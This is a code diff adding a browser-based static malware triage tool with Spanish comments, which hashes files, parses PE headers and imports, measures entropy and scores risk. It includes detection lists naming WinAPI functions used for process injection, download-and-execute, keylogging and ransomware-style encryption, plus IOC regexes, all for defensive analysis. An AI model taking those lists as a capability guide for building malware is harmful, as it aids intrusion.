+    a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + C) | 0; d0 = (d0 + D) | 0;
+  }
+  function toHex(n) {
+    const bytes4 = new Uint8Array(4);
+    new DataView(bytes4.buffer).setInt32(0, n, true);
+    return Array.from(bytes4).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  return toHex(a0) + toHex(b0) + toHex(c0) + toHex(d0);
+}
+
+/* ── [DETECCION DE TIPO POR MAGIC BYTES] ───────────────────────── */
+function mdDetectFileType(bytes) {
+  const hex = b => Array.from(bytes.slice(0, 16)).map(x => x.toString(16).padStart(2, '0')).join('');
+  const h = hex();
+  if (bytes[0] === 0x4D && bytes[1] === 0x5A) return { type: 'PE (Windows EXE/DLL)', ext: 'exe/dll' };
+  if (bytes[0] === 0x7F && bytes[1] === 0x45 && bytes[2] === 0x4C && bytes[3] === 0x46) return { type: 'ELF (Linux binario)', ext: 'elf' };
+  if (bytes[0] === 0xCA && bytes[1] === 0xFE && bytes[2] === 0xBA && bytes[3] === 0xBE) return { type: 'Java Class / Mach-O Fat Binary', ext: 'class/macho' };
+  if (bytes[0] === 0xFE && bytes[1] === 0xED && bytes[2] === 0xFA) return { type: 'Mach-O (macOS binario)', ext: 'macho' };
+  if (bytes[0] === 0x25 && bytes[1] === 0x50 && bytes[2] === 0x44 && bytes[3] === 0x46) return { type: 'PDF', ext: 'pdf' };
+  if (bytes[0] === 0x50 && bytes[1] === 0x4B && (bytes[2] === 0x03 || bytes[2] === 0x05 || bytes[2] === 0x07)) return { type: 'ZIP (o DOCX/XLSX/JAR/APK)', ext: 'zip' };
+  if (bytes[0] === 0xD0 && bytes[1] === 0xCF && bytes[2] === 0x11 && bytes[3] === 0xE0) return { type: 'OLE/CFB (DOC/XLS legado)', ext: 'doc/xls' };
+  if (bytes[0] === 0x52 && bytes[1] === 0x61 && bytes[2] === 0x72 && bytes[3] === 0x21) return { type: 'RAR', ext: 'rar' };
+  if (bytes[0] === 0x1F && bytes[1] === 0x8B) return { type: 'GZIP', ext: 'gz' };
+  if (bytes[0] === 0x37 && bytes[1] === 0x7A && bytes[2] === 0xBC && bytes[3] === 0xAF) return { type: '7-Zip', ext: '7z' };
+  if (bytes[0] === 0x7B && bytes[1] === 0x5C && bytes[2] === 0x72 && bytes[3] === 0x74) return { type: 'RTF', ext: 'rtf' };
+  if (bytes[0] === 0x23 && bytes[1] === 0x21) return { type: 'Script con shebang (#!)', ext: 'sh/script' };
+  if (bytes[0] === 0x4D && bytes[1] === 0x53 && bytes[2] === 0x43 && bytes[3] === 0x46) return { type: 'MSCF (instalador Microsoft CAB)', ext: 'cab' };
+  return { type: 'Desconocido / binario generico', ext: '?' };
+}
+
+/* ── [ENTROPIA DE SHANNON] ─────────────────────────────────────── */
+/* 0 = totalmente uniforme (ej. relleno de ceros), 8 = maxima aleatoriedad
+   (tipico de datos cifrados/comprimidos/empaquetados). Malware empaquetado
+   (UPX, crypters) suele rondar 7.2-8.0 en sus secciones de codigo. */
+function mdEntropy(bytes) {
+  if (!bytes.length) return 0;
+  const freq = new Uint32Array(256);
+  for (let i = 0; i < bytes.length; i++) freq[bytes[i]]++;
+  let entropy = 0;
+  for (let i = 0; i < 256; i++) {
+    if (freq[i] === 0) continue;
+    const p = freq[i] / bytes.length;
+    entropy -= p * Math.log2(p);
+  }
+  return entropy;
+}
+
+/* ── [EXTRACCION DE STRINGS] ────────────────────────────────────── */
+/* Equivalente a `strings` de Unix: ASCII imprimible (4+ caracteres) y
+   UTF-16LE (comun en binarios de Windows, que usan wide-chars). El limite
+   de cantidad evita que un archivo gigante cuelgue el navegador. */
+function mdExtractStrings(bytes, minLen, maxCount) {
+  minLen = minLen || 4;
+  maxCount = maxCount || 5000;
+  const results = [];
+  // ASCII imprimible
+  let cur = '';
+  for (let i = 0; i < bytes.length && results.length < maxCount; i++) {
+    const b = bytes[i];
+    if (b >= 0x20 && b <= 0x7e) { cur += String.fromCharCode(b); }
+    else { if (cur.length >= minLen) results.push(cur); cur = ''; }
+  }
+  if (cur.length >= minLen && results.length < maxCount) results.push(cur);
+  // UTF-16LE (cada char ASCII seguido de 0x00)
+  let curW = '';
+  for (let i = 0; i + 1 < bytes.length && results.length < maxCount; i += 2) {
+    const lo = bytes[i], hi = bytes[i + 1];
+    if (hi === 0x00 && lo >= 0x20 && lo <= 0x7e) { curW += String.fromCharCode(lo); }
+    else { if (curW.length >= minLen) results.push(curW); curW = ''; }
+  }
+  if (curW.length >= minLen && results.length < maxCount) results.push(curW);
+  return results;
+}
+
+/* ── [INDICADORES / IOCs] ───────────────────────────────────────── */
+const MD_IOC_PATTERNS = {
+  url: /\bhttps?:\/\/[^\s"'<>]{4,200}/gi,
+  ipv4: /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g,
+  email: /\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b/gi,
+  winpath: /[a-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*[^\\\/:*?"<>|\r\n]*/gi,
+  regkey: /\b(?:HKEY_[A-Z_]+|HKLM|HKCU|HKCR)\\[^\s"'<>]{2,150}/gi,
+  onion: /\b[a-z2-7]{16,56}\.onion\b/gi,
+};
+/* Funciones WinAPI que, en combinacion, son fuertes indicadores de
+   comportamiento malicioso (inyeccion de procesos, persistencia,
+   descarga y ejecucion, keylogging, evasion). */
+const MD_SUSPICIOUS_APIS = {
+  'Inyeccion de procesos': ['VirtualAllocEx','WriteProcessMemory','CreateRemoteThread','NtUnmapViewOfSection','QueueUserAPC','SetThreadContext','ZwCreateThreadEx'],
+  'Descarga y ejecucion': ['URLDownloadToFile','InternetOpenUrl','WinExec','ShellExecute','CreateProcess','HttpSendRequest'],
+  'Persistencia': ['RegSetValueEx','RegCreateKeyEx','CreateService','SetWindowsHookEx'],
+  'Evasion / anti-analisis': ['IsDebuggerPresent','CheckRemoteDebuggerPresent','GetTickCount','Sleep','NtQueryInformationProcess','OutputDebugString'],
+  'Keylogging / vigilancia': ['GetAsyncKeyState','GetForegroundWindow','SetWindowsHookEx','GetKeyboardState'],
+  'Cifrado (ransomware-like)': ['CryptEncrypt','CryptGenKey','CryptAcquireContext','BCryptEncrypt'],
+};
+
+function mdExtractIndicators(strings) {
+  const joined = strings.join('\n');
+  const found = {};
+  Object.keys(MD_IOC_PATTERNS).forEach(function (key) {
+    const matches = joined.match(MD_IOC_PATTERNS[key]) || [];
+    found[key] = Array.from(new Set(matches)).slice(0, 200);
+  });
+  return found;
+}
+
+function mdFindSuspiciousApis(strings) {
+  const strSet = new Set(strings);
+  const found = {};
+  Object.keys(MD_SUSPICIOUS_APIS).forEach(function (category) {
+    const hits = MD_SUSPICIOUS_APIS[category].filter(function (api) { return strSet.has(api); });
+    if (hits.length) found[category] = hits;
+  });
+  return found;
+}
+
+/* ── [PARSEO PE BASICO] ─────────────────────────────────────────── */
+/* Header DOS (MZ) -> puntero a header PE -> COFF header -> Optional
+   header -> tabla de secciones -> tabla de imports. Suficiente para
+   triaje: no necesita ejecutar nada, solo leer offsets. */
+function mdParsePE(bytes) {
+  try {
+    if (bytes.length < 0x40 || bytes[0] !== 0x4D || bytes[1] !== 0x5A) return null;
+    const dv = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
+    const peOffset = dv.getUint32(0x3C, true);
+    if (peOffset + 24 > bytes.length) return null;
+    if (dv.getUint32(peOffset, true) !== 0x00004550) return null; // "PE\0\0"
+
+    const machine = dv.getUint16(peOffset + 4, true);
+    const numSections = dv.getUint16(peOffset + 6, true);
+    const timestamp = dv.getUint32(peOffset + 8, true);
+    const characteristics = dv.getUint16(peOffset + 22, true);
+    const optHeaderSize = dv.getUint16(peOffset + 20, true);
+    const optHeaderOffset = peOffset + 24;
+    const magic = dv.getUint16(optHeaderOffset, true);
+    const is64 = magic === 0x20b;
+    const isDLL = !!(characteristics & 0x2000);
+    const subsystem = dv.getUint16(optHeaderOffset + (is64 ? 68 : 68), true);
+
+    const MACHINE_MAP = { 0x14c: 'x86 (32-bit)', 0x8664: 'x64 (AMD64)', 0x1c0: 'ARM', 0xaa64: 'ARM64' };
+    const SUBSYS_MAP = { 1: 'Native', 2: 'Windows GUI', 3: 'Windows Console', 5: 'OS/2', 7: 'POSIX' };
+
+    /* Tabla de secciones */
+    const sectionTableOffset = optHeaderOffset + optHeaderSize;
+    const sections = [];
+    for (let i = 0; i < numSections && i < 96; i++) {
+      const base = sectionTableOffset + i * 40;
+      if (base + 40 > bytes.length) break;
+      let name = '';
+      for (let j = 0; j < 8; j++) { const c = bytes[base + j]; if (c === 0) break; name += String.fromCharCode(c); }
+      const virtualSize = dv.getUint32(base + 8, true);
+      const rawSize = dv.getUint32(base + 16, true);
+      const rawPtr = dv.getUint32(base + 20, true);
+      const sectionChar = dv.getUint32(base + 36, true);
+      let sectionEntropy = 0;
+      if (rawPtr + rawSize <= bytes.length && rawSize > 0) {
+        sectionEntropy = mdEntropy(bytes.subarray(rawPtr, rawPtr + Math.min(rawSize, 200000)));
+      }
+      sections.push({
+        name: name || '(sin nombre)', virtualSize: virtualSize, rawSize: rawSize,
+        entropy: sectionEntropy,
+        executable: !!(sectionChar & 0x20000000),
+        writable: !!(sectionChar & 0x80000000),
+      });
+    }
+
+    /* Imports: recorre el Import Directory Table (data directory #1) */
+    const imports = {};
+    try {
+      const dataDirOffset = optHeaderOffset + (is64 ? 112 : 96);
+      const importDirRVA = dv.getUint32(dataDirOffset + 8, true);
+      if (importDirRVA > 0) {
+        function rvaToOffset(rva) {
+          for (const s of sections) {
+            // reconstruir virtualAddress por seccion (no guardado arriba, releer)
+          }
+          return -1;
+        }
+        // Releer virtualAddress por seccion para el mapeo RVA->offset
+        const secVA = [];
+        for (let i = 0; i < numSections && i < 96; i++) {
+          const base = sectionTableOffset + i * 40;
+          if (base + 40 > bytes.length) break;
+          secVA.push({ va: dv.getUint32(base + 12, true), raw: dv.getUint32(base + 20, true), size: dv.getUint32(base + 8, true) });
+        }
+        function rva2off(rva) {
+          for (const s of secVA) { if (rva >= s.va && rva < s.va + s.size) return s.raw + (rva - s.va); }
+          return -1;
+        }
+        let descOff = rva2off(importDirRVA);
+        let guard = 0;
+        while (descOff > 0 && descOff + 20 <= bytes.length && guard < 200) {
+          guard++;
+          const nameRVA = dv.getUint32(descOff + 12, true);
+          const firstThunkRVA = dv.getUint32(descOff, true) || dv.getUint32(descOff + 16, true);
+          if (nameRVA === 0) break;
+          const nameOff = rva2off(nameRVA);
+          if (nameOff < 0) break;
+          let dllName = '';
+          for (let j = 0; j < 64; j++) { const c = bytes[nameOff + j]; if (!c) break; dllName += String.fromCharCode(c); }
+          const funcs = [];
+          let thunkOff = rva2off(firstThunkRVA);
+          let fguard = 0;
+          while (thunkOff > 0 && thunkOff + (is64 ? 8 : 4) <= bytes.length && fguard < 300) {
+            fguard++;
+            const thunkVal = is64 ? dv.getBigUint64(thunkOff, true) : BigInt(dv.getUint32(thunkOff, true));
+            if (thunkVal === 0n) break;
+            const ordinalFlag = is64 ? (thunkVal & 0x8000000000000000n) : (thunkVal & 0x80000000n);
+            if (!ordinalFlag) {
+              const hintNameRVA = Number(thunkVal & 0x7fffffffn);
+              const hnOff = rva2off(hintNameRVA);
+              if (hnOff > 0) {
+                let fname = '';
+                for (let j = 2; j < 130; j++) { const c = bytes[hnOff + j]; if (!c) break; fname += String.fromCharCode(c); }
+                if (fname) funcs.push(fname);
+              }
+            }
+            thunkOff += is64 ? 8 : 4;
+          }
+          if (dllName) imports[dllName] = funcs;
+          descOff += 20;
+        }
+      }
+    } catch (e) { /* import parsing es best-effort — si falla, seguimos con lo demas */ }
+
+    return {
+      machine: MACHINE_MAP[machine] || ('0x' + machine.toString(16)),
+      isDLL: isDLL, is64: is64,
+      subsystem: SUBSYS_MAP[subsystem] || ('desconocido (' + subsystem + ')'),
+      timestamp: timestamp, timestampDate: timestamp ? new Date(timestamp * 1000).toISOString() : 'N/A',
+      numSections: numSections, sections: sections, imports: imports,
+      totalImportedFuncs: Object.values(imports).reduce(function(s,a){return s+a.length;},0),
+    };
+  } catch (e) { return null; }
+}
+
+/* ── [SCORING DE RIESGO HEURISTICO] ────────────────────────────── */
+/* NUNCA es un veredicto — es una señal para priorizar que revisar primero.
+   "Bajo riesgo" no significa "seguro"; "alto riesgo" no significa "malware
+   confirmado" (un instalador legitimo empaquetado con UPX tambien puntua alto). */
+function mdRiskScore(analysis) {
+  let score = 0;
+  const reasons = [];
+
+  if (analysis.entropy > 7.5) { score += 25; reasons.push('Entropia global muy alta (' + analysis.entropy.toFixed(2) + ') — posible empaquetado/cifrado'); }
+  else if (analysis.entropy > 7.0) { score += 10; reasons.push('Entropia global alta (' + analysis.entropy.toFixed(2) + ')'); }
+
+  if (analysis.pe) {
+    const execWritable = analysis.pe.sections.filter(function (s) { return s.executable && s.writable; });
+    if (execWritable.length) { score += 20; reasons.push('Seccion(es) ejecutable Y escribible a la vez: ' + execWritable.map(function(s){return s.name;}).join(', ') + ' (tipico de packers/shellcode)'); }
+    const highEntropySections = analysis.pe.sections.filter(function (s) { return s.entropy > 7.2; });
+    if (highEntropySections.length) { score += 15; reasons.push('Seccion(es) con entropia de empaquetado: ' + highEntropySections.map(function(s){return s.name;}).join(', ')); }
+    if (analysis.pe.numSections <= 2) { score += 10; reasons.push('Muy pocas secciones (' + analysis.pe.numSections + ') — comun en binarios empaquetados'); }
+    if (analysis.pe.totalImportedFuncs > 0 && analysis.pe.totalImportedFuncs < 5) { score += 10; reasons.push('Muy pocos imports (' + analysis.pe.totalImportedFuncs + ') — posible resolucion dinamica de APIs (evasion)'); }
+  }
+
+  const susApis = analysis.suspiciousApis || {};
+  const susCategories = Object.keys(susApis);
+  if (susCategories.length >= 3) { score += 30; reasons.push('APIs sospechosas en ' + susCategories.length + ' categorias distintas: ' + susCategories.join(', ')); }
+  else if (susCategories.length >= 1) { score += susCategories.length * 8; reasons.push('APIs sospechosas detectadas: ' + susCategories.join(', ')); }
+
+  if (analysis.indicators) {
+    if ((analysis.indicators.onion || []).length) { score += 15; reasons.push('Dominio(s) .onion detectados (' + analysis.indicators.onion.length + ')'); }
+    if ((analysis.indicators.ipv4 || []).length > 5) { score += 10; reasons.push('Multiples IPs embebidas (' + analysis.indicators.ipv4.length + ') — posible lista de C2'); }
+  }
+
+  score = Math.min(100, score);
+  let level = 'bajo';
+  if (score >= 60) level = 'critico';
+  else if (score >= 35) level = 'alto';
+  else if (score >= 15) level = 'medio';
+
+  return { score: score, level: level, reasons: reasons };
+}
+
+/* ── [ESCAPE HTML — CRITICO] ────────────────────────────────────── */
+/* El archivo analizado es HOSTIL por definicion. Cualquier string extraida
+   (nombres de imports, strings del binario, IOCs) puede contener HTML/JS
+   armado a proposito para atacar a quien lo analiza (tecnica documentada:
+   malware que hace XSS a herramientas de analisis). TODO lo que viene del
+   archivo pasa por esto antes de tocar innerHTML. */
+function mdEsc(s) {
+  return String(s).replace(/[&<>"']/g, function (c) {
+    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+  });
+}
+
+/* ── [ORQUESTADOR PRINCIPAL] ────────────────────────────────────── */
+async function mdAnalyzeFile(file, onProgress) {
+  const buf = await file.arrayBuffer();
+  const bytes = new Uint8Array(buf);
+
+  onProgress && onProgress('Calculando hashes...');
+  const [md5, sha1, sha256] = await Promise.all([
+    Promise.resolve(mdMd5(buf)), mdSha1(buf), mdSha256(buf)
+  ]);
+
+  onProgress && onProgress('Detectando tipo de archivo...');
+  const fileType = mdDetectFileType(bytes);
+
+  onProgress && onProgress('Calculando entropia...');
+  const entropy = mdEntropy(bytes);
+
+  onProgress && onProgress('Extrayendo strings...');
+  const strings = mdExtractStrings(bytes, 4, 5000);
+
+  onProgress && onProgress('Buscando indicadores de red...');
+  const indicators = mdExtractIndicators(strings);
+  const suspiciousApis = mdFindSuspiciousApis(strings);
+
+  onProgress && onProgress('Analizando estructura PE (si aplica)...');
+  const pe = mdParsePE(bytes);
+
+  const analysis = {
+    fileName: file.name, fileSize: file.size, fileType: fileType,
+    md5: md5, sha1: sha1, sha256: sha256, entropy: entropy,
+    strings: strings, indicators: indicators, suspiciousApis: suspiciousApis, pe: pe,
+  };
+  analysis.risk = mdRiskScore(analysis);
+  return analysis;
+}
+
+/* ── [RENDERIZADO — TODO pasa por mdEsc() antes de tocar innerHTML] ── */
+const $m = id => document.getElementById(id);
+const MD_MAX_SIZE = 100 * 1024 * 1024; // 100 MB
+
+function mdFmtBytes(n) {
+  if (n < 1024) return n + ' B';
+  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
+  if (n < 1024 * 1024 * 1024) return (n / (1024 * 1024)).toFixed(2) + ' MB';
+  return (n / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
+}
+
+function mdRenderOverview(a) {
+  const ov = $m('md-overview');
+  ov.innerHTML =
+    '<div class="md-ov-cell"><span class="md-ov-label">Archivo</span><span class="md-ov-value">' + mdEsc(a.fileName) + '</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">Tamaño</span><span class="md-ov-value">' + mdEsc(mdFmtBytes(a.fileSize)) + '</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">Tipo real (magic bytes)</span><span class="md-ov-value">' + mdEsc(a.fileType.type) + '</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">Entropía</span><span class="md-ov-value">' + a.entropy.toFixed(2) + ' / 8.0</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">MD5</span><span class="md-ov-value hash">' + mdEsc(a.md5) + '</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">SHA1</span><span class="md-ov-value hash">' + mdEsc(a.sha1) + '</span></div>' +
+    '<div class="md-ov-cell"><span class="md-ov-label">SHA256</span><span class="md-ov-value hash">' + mdEsc(a.sha256) + '</span></div>' +
+    '<div class="md-ov-cell md-risk-cell md-risk-' + a.risk.level + '">' +
+      '<span class="md-ov-label">Score de riesgo heurístico (no es un veredicto)</span>' +
+      '<div class="md-risk-label">' + a.risk.score + '/100 — ' + a.risk.level.toUpperCase() + '</div>' +
+      '<div class="md-risk-bar-wrap"><div class="md-risk-bar" style="width:' + a.risk.score + '%;"></div></div>' +
+      (a.risk.reasons.length ? '<ul class="md-risk-reasons">' + a.risk.reasons.map(r => '<li>' + mdEsc(r) + '</li>').join('') + '</ul>' : '<div style="font-family:var(--mono);font-size:11.5px;color:rgba(240,238,248,.5);">Sin señales heurísticas detectadas.</div>') +
+    '</div>';
+}
+
+function mdRenderStrings(strings, filter) {
+  const list = $m('md-strings-list');
+  const f = (filter || '').toLowerCase();
+  const filtered = f ? strings.filter(s => s.toLowerCase().includes(f)) : strings;
+  const shown = filtered.slice(0, 1000);
+  if (!shown.length) { list.innerHTML = '<div class="md-strings-empty">Sin strings' + (f ? ' que coincidan con el filtro' : '') + '.</div>'; return; }
+  list.innerHTML = shown.map(s => '<div>' + mdEsc(s) + '</div>').join('') +
+    (filtered.length > 1000 ? '<div style="color:var(--amber);margin-top:8px;">... y ' + (filtered.length - 1000) + ' más (refiná el filtro para ver otras)</div>' : '');
+}
+
+function mdRenderPE(pe) {
+  const panel = $m('md-panel-pe');
+  if (!pe) { panel.innerHTML = '<div class="md-empty-msg">Este archivo no es un ejecutable PE (Windows) — no hay estructura PE para mostrar.</div>'; return; }
+  let h = '<table class="md-section-table"><tr><td>Máquina</td><td>' + mdEsc(pe.machine) + '</td></tr>' +
+    '<tr><td>Tipo</td><td>' + (pe.isDLL ? 'DLL' : 'EXE') + (pe.is64 ? ' (64-bit)' : ' (32-bit)') + '</td></tr>' +
+    '<tr><td>Subsistema</td><td>' + mdEsc(pe.subsystem) + '</td></tr>' +
+    '<tr><td>Fecha de compilación</td><td>' + mdEsc(pe.timestampDate) + '</td></tr>' +
+    '<tr><td>Total imports</td><td>' + pe.totalImportedFuncs + ' funciones en ' + Object.keys(pe.imports).length + ' DLLs</td></tr></table>';
+
+  h += '<table class="md-section-table"><tr><th>Sección</th><th>Tamaño virtual</th><th>Tamaño en disco</th><th>Entropía</th><th>Permisos</th></tr>';
+  pe.sections.forEach(s => {
+    const hot = s.entropy > 7.2 || (s.executable && s.writable);
+    h += '<tr class="' + (hot ? 'md-hot' : '') + '"><td>' + mdEsc(s.name) + '</td><td>' + mdFmtBytes(s.virtualSize) + '</td><td>' + mdFmtBytes(s.rawSize) + '</td><td>' + s.entropy.toFixed(2) + '</td><td>' + (s.executable ? 'EXEC ' : '') + (s.writable ? 'WRITE' : '') + '</td></tr>';
+  });
+  h += '</table>';
+
+  const dlls = Object.keys(pe.imports);
+  if (dlls.length) {
+    const allSuspicious = new Set(Object.values(MD_SUSPICIOUS_APIS).flat());
+    h += '<div class="md-import-group">';
+    dlls.forEach(dll => {
+      h += '<div class="md-import-dll">' + mdEsc(dll) + '</div><div class="md-import-funcs">';
+      pe.imports[dll].forEach(fn => {
+        h += '<span class="md-import-func' + (allSuspicious.has(fn) ? ' sus' : '') + '">' + mdEsc(fn) + '</span>';
+      });
+      h += '</div>';
+    });
+    h += '</div>';
+  }
+  panel.innerHTML = h;
+}
+
+function mdRenderIOCs(indicators) {
+  const panel = $m('md-panel-iocs');
+  const labels = { url: 'URLs', ipv4: 'Direcciones IP', email: 'Emails', winpath: 'Rutas de Windows', regkey: 'Claves de registro', onion: 'Dominios .onion' };
+  let h = '';
+  Object.keys(labels).forEach(key => {
+    const items = indicators[key] || [];
+    if (!items.length) return;
+    h += '<div class="md-ioc-group"><span class="md-ioc-label">' + labels[key] + ' (' + items.length + ')</span>';
+    items.slice(0, 100).forEach(item => { h += '<div class="md-ioc-item">' + mdEsc(item) + '</div>'; });
+    h += '</div>';
+  });
+  panel.innerHTML = h || '<div class="md-empty-msg">No se encontraron indicadores de red reconocibles en las strings extraídas.</div>';
+}
+
+function mdRenderApis(suspiciousApis) {
+  const panel = $m('md-panel-apis');
+  const cats = Object.keys(suspiciousApis);
+  if (!cats.length) { panel.innerHTML = '<div class="md-empty-msg">No se encontraron nombres de funciones sospechosas conocidas entre las strings.</div>'; return; }
+  panel.innerHTML = cats.map(cat =>
+    '<div class="md-api-cat"><div class="md-api-cat-name">' + mdEsc(cat) + '</div><div class="md-import-funcs">' +
+    suspiciousApis[cat].map(fn => '<span class="md-import-func sus">' + mdEsc(fn) + '</span>').join('') +
+    '</div></div>'
+  ).join('');
+}
+
+/* ── [EVENTOS] ──────────────────────────────────────────────────── */
+let mdCurrentAnalysis = null;
+
+async function mdHandleFile(file) {
+  if (!file) return;
+  if (file.size > MD_MAX_SIZE) {
+    $m('md-progress-line').style.display = 'block';
+    $m('md-progress-line').textContent = '✕ Archivo demasiado grande (' + mdFmtBytes(file.size) + ') — límite: ' + mdFmtBytes(MD_MAX_SIZE) + '.';
+    $m('md-progress-line').style.color = 'var(--red)';
+    return;
+  }
+  $m('md-results').style.display = 'none';
+  $m('md-progress-line').style.display = 'block';
+  $m('md-progress-line').style.color = 'var(--amber)';
+  $m('md-progress-line').textContent = 'Leyendo archivo...';
+
+  try {
+    const analysis = await mdAnalyzeFile(file, (msg) => { $m('md-progress-line').textContent = msg; });
+    mdCurrentAnalysis = analysis;
+    $m('md-progress-line').style.display = 'none';
+    $m('md-results').style.display = 'block';
+    mdRenderOverview(analysis);
+    mdRenderStrings(analysis.strings, '');
+    mdRenderPE(analysis.pe);
+    mdRenderIOCs(analysis.indicators);
+    mdRenderApis(analysis.suspiciousApis);
+  } catch (e) {
+    $m('md-progress-line').style.color = 'var(--red)';
+    $m('md-progress-line').textContent = '✕ Error analizando el archivo: ' + e.message;
+  }
+}
+
+const mdDropzone = $m('md-dropzone');
+const mdFileInput = $m('md-file-input');
+if (mdDropzone) {
+  mdDropzone.addEventListener('click', () => mdFileInput.click());
+  mdDropzone.addEventListener('dragover', (e) => { e.preventDefault(); mdDropzone.classList.add('dragover'); });
+  mdDropzone.addEventListener('dragleave', () => mdDropzone.classList.remove('dragover'));
+  mdDropzone.addEventListener('drop', (e) => {
+    e.preventDefault();
+    mdDropzone.classList.remove('dragover');
+    if (e.dataTransfer.files && e.dataTransfer.files[0]) mdHandleFile(e.dataTransfer.files[0]);
+  });
+}
+if (mdFileInput) mdFileInput.addEventListener('change', (e) => { if (e.target.files[0]) mdHandleFile(e.target.files[0]); });
+
+document.querySelectorAll('#medusa .md-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('#medusa .md-tab').forEach(t => t.classList.toggle('active', t === tab));
+    document.querySelectorAll('#medusa .md-tab-panel').forEach(p => p.classList.remove('active'));
+    const panel = $m('md-panel-' + tab.dataset.tab);
+    if (panel) panel.classList.add('active');
+  });
+});
+
+const mdStringsFilter = $m('md-strings-filter');
+if (mdStringsFilter) mdStringsFilter.addEventListener('input', () => {
+  if (mdCurrentAnalysis) mdRenderStrings(mdCurrentAnalysis.strings, mdStringsFilter.value);
+});
 
 })();
 </script>
